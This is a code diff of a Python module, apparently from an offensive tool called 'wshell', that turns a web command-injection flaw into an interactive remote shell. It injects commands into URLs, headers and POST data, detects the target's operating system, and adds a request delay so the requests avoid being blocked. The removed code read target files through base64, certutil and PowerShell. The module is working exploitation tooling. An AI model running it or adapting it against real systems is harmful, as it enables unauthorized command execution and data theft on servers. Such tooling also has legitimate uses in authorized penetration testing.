@@ -1,14 +1,15 @@
 import hashlib
 import random
 import re
+import time
 from enum import StrEnum
-from typing import Callable, Dict, List, Optional
+from typing import Callable, Dict, List, Optional, Type, override
 from urllib.parse import quote as url_encode
 
 import requests
 import urllib3
 
-from wshell import settings, utils
+from wshell import settings
 from wshell.errors import (
     CommandExecutionError,
     OsDetectionError,
@@ -37,19 +38,21 @@ class CommandInjector:
             self,
             reuse_connection: bool,
             allow_redirects: bool,
-            timeout: float,
             use_json_post_data: bool,
             method: str,
             url: str,
-            post_data: Optional[Dict[str, str]] = None,
-            headers: Optional[Dict[str, str]] = None,
+            timeout: Optional[float] = settings.DEFAULT_TIMEOUT,
+            delay: float = settings.DEFAULT_DELAY,
+            post_data: Dict[str, str] = dict(),
+            headers: Dict[str, str] = dict(),
             command_placeholder: str = settings.DEFAULT_COMMAND_PLACEHOLDER,
-            input_scripts: Optional[List[Callable[[str], str]]] = [],
-            output_scripts: Optional[List[Callable[[str], str]]] = []
+            input_scripts: List[Callable[[str], str]] = [],
+            output_scripts: List[Callable[[str], str]] = []
     ):
         self.http = requests.Session() if reuse_connection else requests
         self.allow_redirects = allow_redirects
         self.timeout = timeout
+        self.delay = delay
         self.use_json_post_data = use_json_post_data
         self.url = url
         self.headers = headers
@@ -89,7 +92,7 @@ class CommandInjector:
         logger.debug(f"Using placeholder: {placeholder}")
 
         # Remove any comment to avoid problems with placeholders in the resulting final command
-        cmd = self._remove_comments(cmd)
+        cmd = self._remove_commented_out(cmd)
 
         # To make `cd` command works over HTTP shell we need to change to the desired directory
         # before the execution of every command
@@ -106,7 +109,7 @@ class CommandInjector:
         # (GET parameters, POST data and request headers)
         url = self.url.replace(self.command_placeholder, url_encode(cmd))
 
-        headers = dict()
+        headers: Dict[str, str] = dict()
         for key, value in self.headers.items():
             headers[key] = value.replace(self.command_placeholder, cmd)
 
@@ -115,6 +118,9 @@ class CommandInjector:
             post_data[key] = value.replace(self.command_placeholder, cmd)
 
         post_data = dict(json=post_data) if self.use_json_post_data else dict(data=post_data)
+
+        # Slow down the requests in case it is necessary to not being blocked
+        time.sleep(self.delay)
 
         try:
             response = self.http.request(
@@ -150,7 +156,7 @@ class CommandInjector:
         command_output = match.group("command_output")
         return command_output if not strip else command_output.strip()
 
-    def _remove_comments(self, cmd: str) -> str:
+    def _remove_commented_out(self, cmd: str) -> str:
         """ Remove any commented out part of the command """
         return re.sub(r"#.*$", "", cmd, flags=re.MULTILINE)
 
@@ -184,6 +190,10 @@ class CommandInjector:
             else:
                 raise OsDetectionError(f"Unrecognized output: {repr(cmd_output)}")
 
+        if not self.OS:
+            logger.error("Unable to detect target OS automatically. Please, specify it manually.")
+            raise OsDetectionError("Unable to detect target OS")
+
         return self.OS
 
     def is_linux(self) -> bool:
@@ -216,11 +226,8 @@ class CommandInjector:
         """ Return the current working directory """
         return self.change_directory(".")
 
-    def get_prompt(self):
+    def get_prompt(self) -> str:
         """ Get the specific prompt string for the target OS """
-        raise NotImplementedError
-
-    def base64_cat(self, filename: str) -> str:
         raise NotImplementedError
 
 
@@ -229,21 +236,25 @@ class LinuxCommandInjector(CommandInjector):
     OS = OSEnum.LINUX
     CURRENT_DIRECTORY_COMMAND = "pwd"
 
+    @override
     def get_prompt(self):
         # Outputs like "www-data@target:/var/www/html$ "
-        user = self.execute('whoami', strip=True)
+        # in case of user with no username it will use the user ID
+        id = self.execute('id', strip=True)
+        user_name_or_id = re.match(r"^uid=(?P<user_id>\d+)(\((?P<username>.*?)\))? ", id)
+
+        user = user_name_or_id.group("username") or user_name_or_id.group("user_id") if user_name_or_id else "unknown"
+
         host = self.execute('hostname', strip=True)
         pwd  = self.execute('pwd', strip=True)
-        return f"{user}@{host}:{pwd}{'$' if user != 'root' else '#'} "
+        return f"{user}@{host}:{pwd}{'$' if user not in ('root', '0') else '#'} "
 
+    @override
     def change_directory(self, directory: str) -> str:
         # Make `cd` with no arguments works
         if not directory.strip():
             self.cwd = "."
         return super().change_directory(directory)
-
-    def base64_cat(self, filename: str) -> str:
-        return self.execute(f"base64 {filename} 2>&1")
 
 
 class WindowsCmdCommandInjector(CommandInjector):
@@ -253,7 +264,8 @@ class WindowsCmdCommandInjector(CommandInjector):
     PATH_DELIMITER = "\\"
     CURRENT_DIRECTORY_COMMAND = "cd"
 
-    def _remove_comments(self, cmd: str) -> str:
+    @override
+    def _remove_commented_out(self, cmd: str) -> str:
         # Matches:
         #   REM <comment>
         #   @REM <comment>
@@ -261,25 +273,10 @@ class WindowsCmdCommandInjector(CommandInjector):
         #   command& REM <comment>
         return re.sub(r"(&\s*)?(@?REM|::).*$", "", cmd, flags=re.MULTILINE|re.IGNORECASE)
 
+    @override
     def get_prompt(self):
         # Outputs like "C:\Users\wshell>"
         return f"{self.current_directory()}> "
-
-    def base64_cat(self, filename: str) -> str:
-        random_filename = utils.random_string()
-        self.execute(f"certutil -encode '{filename}' %TEMP%/{random_filename}")
-        base64_output = self.execute(f"type %TEMP%/{random_filename}")
-
-        # `certutil` output will be something like:
-        #
-        # -----BEGIN CERTIFICATE-----
-        # V1NoZWxsIGxldHMgeW91IHR1cm4gYSB3ZWItYmFzZWQge2NvZGUsY29tbWFuZCx0ZW1wbGF0ZX0g
-        # aW5qZWN0aW9uIGluIGEgZnVsbCBmZWF0dXJlZCBzaGVsbCB3aXRoIGVhc2UuCg==
-        # -----END CERTIFICATE-----
-        #
-        # So, we need to remove the first and the last lines
-        #
-        return base64_output[1:-2]
 
 
 class WindowsPshCommandInjector(CommandInjector):
@@ -298,28 +295,24 @@ class WindowsPshCommandInjector(CommandInjector):
     #
     CURRENT_DIRECTORY_COMMAND = "'' + (Get-Location)"
 
+    @override
     def get_prompt(self):
         # Outputs like "PS C:\Users\wshell>"
         return f"PS {self.current_directory()}> "
 
-    def base64_cat(self, filename: str) -> str:
-        return self.execute(
-            f"$file_content = Get-Content '{filename}'; [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($file_content))"
-        )
 
-
-def get_command_injector(os: OSEnum = None, *args, **kwargs):
+def get_command_injector(os: Optional[OSEnum] = None, *args, **kwargs) -> CommandInjector:
     """ Return an initialized command injector for the specified OS or auto-discover the more appropriate one """
     if os is None:
         injector = CommandInjector(*args, **kwargs)
         os = injector.OS
 
-    os_injector_map = {
+    os_injector_map: Dict[OSEnum, Type[CommandInjector]] = {
         OSEnum.LINUX: LinuxCommandInjector,
         OSEnum.WIN_CMD: WindowsCmdCommandInjector,
         OSEnum.WIN_PSH: WindowsPshCommandInjector
     }
-    if os in os_injector_map:
+    if os and os in os_injector_map:
         return os_injector_map[os](*args, **kwargs)
     else:
         raise OsDetectionError(f"Unknown OS: {os}")
